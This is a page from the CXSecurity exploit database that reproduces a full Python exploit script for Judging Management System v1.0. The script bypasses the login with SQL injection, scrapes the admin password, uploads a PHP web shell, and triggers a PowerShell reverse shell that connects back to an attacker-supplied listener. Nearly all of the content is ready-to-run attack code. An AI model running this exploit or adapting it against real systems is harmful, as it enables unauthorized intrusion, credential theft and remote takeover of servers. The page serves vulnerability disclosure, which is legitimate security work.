---
title: Judging Management System v1.0 Remote Code Execution (RCE)
url: https://cxsecurity.com/issue/WLB-2023040002
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2023-04-03
fetch_date: 2025-10-04T11:29:17.209107
---

# Judging Management System v1.0 Remote Code Execution (RCE)

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Judging Management System v1.0 Remote Code Execution (RCE)** **2023.04.02**  Credit:  **[Angelo Pio Amirante](https://cxsecurity.com/author/Angelo%2BPio%2BAmirante/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **N/A** | |

# Exploit Title: Judging Management System v1.0 - Remote Code Execution (RCE)
# Date: 12/11/2022
# Exploit Author: Angelo Pio Amirante
# Vendor Homepage: https://www.sourcecodester.com/
# Software Link: https://www.sourcecodester.com/php/15910/judging-management-system-using-php-and-mysql-free-source-code.html
# Version: 1.0
# Tested on: Windows 10 on XAAMP server
import requests,argparse,re,time,base64
import urllib.parse
from colorama import (Fore as F,Back as B,Style as S)
from bs4 import BeautifulSoup
BANNER = """
╔═══════════════════════════════════════════════════════════════════════════════════════════════════════╗
║ Judging Management System v1.0 - Auth Bypass + Unrestricted File Upload = Remote Code Execution (RCE) ║
╚═══════════════════════════════════════════════════════════════════════════════════════════════════════╝
"""
def argsetup():
desc = S.BRIGHT + 'Judging Management System v1.0 - Remote Code Execution (RCE)'
parser = argparse.ArgumentParser(description=desc)
parser.add\_argument('-t', '--target', help='Target URL, Ex: http://localhost/php-jms', required=True)
parser.add\_argument('-l', '--listenip', help='Listening address required to receive reverse shell', required=True)
parser.add\_argument('-lp','--listenport', help='Listening port required to receive reverse shell', required=True)
args = parser.parse\_args()
return args
# Performs Auth bypass in order to get the admin cookie
def auth\_bypass(args):
print(F.CYAN+"[+] Login into the application through Auth Bypass vulnerability...")
session = requests.Session()
loginUrl = f"{args.target}/login.php"
username = """' OR 1=1-- -"""
password = "randomvalue1234"
data = {'username': username, 'password': password}
login = session.post(loginUrl,verify=False,data=data)
admin\_cookie = login.cookies['PHPSESSID']
print(F.GREEN+"[+] Admin cookies obtained !!!")
return admin\_cookie
# Checks if the file has been uploaded to /uploads directory
def check\_file(args,cookie):
uploads\_endpoint = f"{args.target}/uploads/"
cookies = {'PHPSESSID': f'{cookie}'}
req = requests.get(uploads\_endpoint,verify=False,cookies=cookies)
soup = BeautifulSoup(req.text,features='html.parser')
files = soup.find\_all("a")
for i in range (len(files)):
match = re.search(".\*-shelljudgesystem\.php",files[i].get('href'))
if match:
file = files[i].get('href')
print(F.CYAN+"[+] The webshell is at the following Url: "+f"{args.target}/uploads/"+file)
return file
return None
def file\_upload(args,cookie):
now = int(time.time())
endpoint = f"{args.target}/edit\_organizer.php"
cookies = {'wp-settings-time-1':f"{now}",'PHPSESSID': f'{cookie}'}
get\_req = requests.get(endpoint,verify=False,cookies=cookies)
soup = BeautifulSoup(get\_req.text,features='html.parser')
username = soup.find("input",{"name":"username"}).get('value')
admin\_password = soup.find("input",{"id":"password"}).get('value')
print(F.GREEN + "[+] Admin username: " + username)
print(F.GREEN + "[+] Admin password: " + admin\_password)
# Multi-part request
file\_dict = {
'fname':(None,"Random"),
'mname':(None,"Random"),
'lname':(None,"Random"),
'email':(None,"ranom@mail.com"),
'pnum':(None,"014564343"),
'cname':(None,"Random"),
'caddress':(None,"Random"),
'ctelephone':(None,"928928392"),
'cemail':(None,"company@mail.com"),
'cwebsite':(None,"http://company.com"),
'file':("shelljudgesystem.php","<?php system($\_REQUEST['cmd']) ?>","application/octet-stream"),
'username':(None,f"{admin\_password}"),
'passwordx':(None,f"{admin\_password}"),
'password2x':(None,f"{admin\_password}"),
'password':(None,f"{admin\_password}"),
'update':(None,"")
}
req = requests.post(endpoint,verify=False,cookies=cookies,files=file\_dict)
def exploit(args,cookie,file):
payload = f"""powershell+-nop+-c+"$client+%3d+New-Object+System.Net.Sockets.TCPClient('{args.listenip}',{args.listenport})%3b"""+"""$stream+%3d+$client.GetStream()%3b[byte[]]$bytes+%3d+0..65535|%25{0}%3bwhile(($i+%3d+$stream.Read($bytes,+0,+$bytes.Length))+-ne+0){%3b$data+%3d+(New-Object+-TypeName+System.Text.ASCIIEncoding).GetString($bytes,0,+$i)%3b$sendback+%3d+(iex+$data+2>%261+|+Out-String+)%3b$sendback2+%3d+$sendback+%2b+'PS+'+%2b+(pwd).Path+%2b+'>+'%3b$sendbyte+%3d+([text.encoding]%3a%3aASCII).GetBytes($sendback2)%3b$stream.Write($sendbyte,0,$sendbyte.Length)%3b$stream.Flush()}%3b$client.Close()" """
uploads\_endpoint = f"{args.target}/uploads/{file}?cmd={payload}"
cookies = {'PHPSESSID': f'{cookie}'}
print(F.GREEN + "\n[+] Enjoy your reverse shell ")
requests.get(uploads\_endpoint,verify=False,cookies=cookies)
if \_\_name\_\_ == '\_\_main\_\_':
print(F.CYAN + BANNER)
args = argsetup()
cookie=auth\_bypass(args=args)
file\_upload(args=args,cookie=cookie)
file\_name=check\_file(args=args,cookie=cookie)
if file\_name is not None:
exploit(args=args,cookie=cookie,file=file\_name)
else:
print(F.RED + "[!] File not found")

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2023040002)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top